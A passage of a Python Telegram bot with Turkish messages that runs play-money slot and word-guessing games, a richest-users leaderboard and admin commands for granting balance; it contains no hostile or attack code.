    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

@bot.message_handler(commands=['zenginler'])
def show_leaderboard(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return

    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "🏆 En İyi 10 Zengin:\n\n"
    for i, (user_id, balance) in enumerate(sorted_balances[:10], start=1):
        try:
          user = bot.get_chat(user_id)
          user_name = user.first_name if user.first_name else "Bilinmiyor"
          leaderboard_message += f"🎖️ {i-1}. {user_name} ⇒ {balance} TL\n"
        except:
          no_have_a = "problem"

    bot.reply_to(message, leaderboard_message)
    
@bot.message_handler(commands=['yardim'])
def send_help_message(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    help_message = """
    ⭐ Hey dostum aşağıdaki komutları kullanabilirsin

/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.

/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 1500 tl Kazan.

/bakiye: 💰 Mevcut bakiyenizi kontrol edin.

/risk: Risk oyunu oynayıp bakiye kazanabilirsiniz.

/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.

/zenginler: 🏆 Genel Sıralamayı gösterir.

/yardim: ℹ️ Bu yardım mesajını görüntüleyin.
    """
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['slot'])
def slot_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Slot Oyununu Oynayarak Bakiyen kasın Çıkarın\nKullanım: /slot <miktar>')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    try:
        bet_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir bahis miktarı girin. Kullanım: /slot <miktar>')
        return

    if bet_amount <= 0:
        bot.reply_to(message, 'Bahis miktarı sayı olmalı.')
        return

    if user_balances[user_id] < bet_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    slot_result = random.choices(["🍒", "🍋", "🍉", "⭐", "💎", "🍊", "🍏", "🔔"], k=3)
    unique_symbols = len(set(slot_result))

    if unique_symbols == 1:  
        winnings = bet_amount * 4
        user_balances[user_id] += winnings - bet_amount  
        bot.reply_to(message, f'3 sembol eşleşti! Kazandınız!\nKazanılan Bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    elif unique_symbols == 2: 
        winnings = bet_amount * 3
        user_balances[user_id] += winnings - bet_amount 
        bot.reply_to(message, f'2 sembol eşleşti Kazandınız!\nKazanılan bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    else:
        user_balances[user_id] -= bet_amount
        bot.reply_to(message, f'Kazanamadınız. Bir dahakine daha şanslı olabilirsiniz.\nSlot sonucu: {" ".join(slot_result)}\nKalan bakiye: {user_balances[user_id]} TL')

    save_balances()
    
@bot.message_handler(commands=['gonder'])
def send_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanma yetkin yok yarram.', reply_to_message_id=message.message_id)
        return

    if not message.reply_to_message:
        bot.reply_to(message, 'Bu komutu kullanmak için bir mesaja yanıt vermelisiniz.', reply_to_message_id=message.message_id)
        return

    try:
        parts = message.text.split()
        amount = int(parts[1])
        target_id = str(message.reply_to_message.from_user.id)
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir format kullanın. Kullanım: /gonder <miktar>', reply_to_message_id=message.message_id)
        return

    if amount <= 0:
        bot.reply_to(message, 'Gönderilecek miktar pozitif bir sayı olmalıdır.', reply_to_message_id=message.message_id)
        return

    if target_id not in user_balances:
        user_balances[target_id] = 100  

    user_balances[target_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {target_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi. Yeni bakiye: {user_balances[target_id]} TL', reply_to_message_id=message.message_id)
  
@bot.message_handler(commands=['f'])
def free(message):
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        return bot.reply_to(message, "Bu komutu kullanmaya yetkiniz yok.")
    
    try:
        with open('balances.json', "r") as file:
            balances = json.load(file)

        for key, value in balances.items():
            if value == 0:
                user_balances[key] = 25000

        save_balances()
        bot.reply_to(message, "Tüm uygun kullanıcılara 25000 bakiye gönderildi.")
        
    except json.JSONDecodeError:
        bot.reply_to(message, "Bakiye dosyası okunamadı. Lütfen dosya formatını kontrol edin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")
    
@bot.message_handler(commands=['kelime'])
def start_word_game(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if chat_id in word_game_sessions:
        bot.send_message(chat_id, 'Oyun zaten başlatıldı.')
        return

    target_word = random.choice(kelimeler)
    word_game_sessions[chat_id] = {'target_word': target_word.upper()}
    word_game_sessions[chat_id]['revealed_letters'] = ['_' if c.isalpha() else c for c in word_game_sessions[chat_id]['target_word']]
    bot.send_message(chat_id, 'Kelime Oyununa Hoş Geldiniz!\n\n' + ' '.join(word_game_sessions[chat_id]['revealed_letters']))

@bot.message_handler(func=lambda message: True)
def handle_word_guess(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id  

    if chat_id not in word_game_sessions:
        return

    if user_id not in user_balances:
        return

    target_word = word_game_sessions[chat_id]['target_word'].upper()
    revealed_letters = word_game_sessions[chat_id]['revealed_letters']

    guess = message.text.upper()

    if len(guess) != 1 and len(guess) != len(target_word):
        bot.reply_to(message, '')
    elif guess == target_word:
        user_balances[user_id] += 1500 
        user_name = message.from_user.first_name
        bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
        del word_game_sessions[chat_id]
    elif guess in target_word:
        for i, letter in enumerate(target_word):
            if letter == guess:
                revealed_letters[i] = guess
        if '_' not in revealed_letters:
            user_balances[user_id] += 1500
            user_name = message.from_user.first_name
            bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
            del word_game_sessions[chat_id]
        else:
            bot.reply_to(message, 'Doğru tahmin! Harf ekledim: ' + ' '.join(revealed_letters))
    else:
        bot.reply_to(message, 'Yanlış tahmin! 👎')  



while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Hata: {e} ")
